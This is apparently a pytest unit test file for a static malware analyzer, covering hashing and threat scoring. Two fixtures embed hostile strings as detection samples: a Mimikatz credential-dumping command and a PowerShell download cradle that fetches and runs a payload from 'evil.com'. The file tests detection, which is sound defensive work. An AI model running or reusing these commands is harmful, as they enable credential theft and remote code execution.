"""Unit tests for the static analysis orchestrator."""
import pytest
from engine.static.analyzer import analyze_file
from engine.static.models import ThreatLevel


def test_analyze_text_file(tmp_path):
    f = tmp_path / "hello.txt"
    f.write_text("Hello, world!")
    result = analyze_file(f)
    assert result.file_size == 13
    assert result.hashes.sha256 is not None
    assert result.threat_level in (ThreatLevel.CLEAN, ThreatLevel.SUSPICIOUS, ThreatLevel.MALICIOUS)


def test_analyze_nonexistent_file():
    with pytest.raises(FileNotFoundError):
        analyze_file("/nonexistent/path/file.exe")


def test_analyze_mimikatz_string(tmp_path):
    """File containing mimikatz strings should be flagged."""
    f = tmp_path / "bad.ps1"
    f.write_bytes(b"sekurlsa::logonpasswords\x00mimikatz\x00")
    result = analyze_file(f)
    assert result.threat_level in (ThreatLevel.SUSPICIOUS, ThreatLevel.MALICIOUS)
    assert result.confidence > 0.0


def test_analyze_powershell_download_cradle(tmp_path):
    f = tmp_path / "dropper.ps1"
    f.write_bytes(b"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')")
    result = analyze_file(f)
    assert result.threat_level in (ThreatLevel.SUSPICIOUS, ThreatLevel.MALICIOUS)


def test_analyze_clean_binary(tmp_path):
    f = tmp_path / "data.bin"
    f.write_bytes(b"\x00" * 1024)
    result = analyze_file(f)
    assert result.confidence == 0.0 or result.threat_level in (ThreatLevel.CLEAN, ThreatLevel.UNKNOWN)


def test_analyze_returns_hashes(tmp_path):
    f = tmp_path / "sample.bin"
    f.write_bytes(b"test content for hashing")
    result = analyze_file(f)
    assert len(result.hashes.sha256) == 64
    assert len(result.hashes.md5) == 32


def test_analyze_suspicious_filename(tmp_path):
    f = tmp_path / "mimikatz_payload.exe"
    f.write_bytes(b"MZ" + b"\x00" * 100)
    result = analyze_file(f)
    # Suspicious filename alone shouldn't push to malicious but should be noted
    assert result is not None
